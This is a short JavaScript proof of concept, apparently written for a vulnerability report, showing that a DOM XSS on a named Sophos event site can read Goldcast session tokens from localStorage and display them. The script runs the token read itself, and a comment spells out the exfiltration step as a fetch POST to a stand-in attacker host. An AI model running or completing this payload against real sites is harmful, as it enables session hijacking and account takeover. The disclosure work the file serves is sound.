// VULN-36 attend.sophos.com DOM XSS -> Goldcast ATO proof (benign: displays token, does NOT exfil externally)
(function(){
  var at=localStorage.getItem('gcauth_access_token');
  var rt=localStorage.getItem('gcauth_refresh_token');
  var did=localStorage.getItem('gcauth_device_id');
  var msg='VULN-36 ATO PoC in origin '+location.origin+'\n\n'
    +'gcauth_access_token : '+(at?at.slice(0,48)+'... (len '+at.length+')':'(none - log in to attend first)')+'\n'
    +'gcauth_refresh_token: '+(rt?'PRESENT (len '+rt.length+') = persistent ATO':'(none)')+'\n'
    +'gcauth_device_id    : '+(did||'(none)');
  console.log('[VULN-36]',{origin:location.origin,access_token:at,refresh_token:rt,device_id:did});
  document.title='ATO-'+document.domain;
  alert(msg);
  // Real attacker would: fetch('https://attacker/x',{method:'POST',body:JSON.stringify({at:at,rt:rt,did:did})})
})();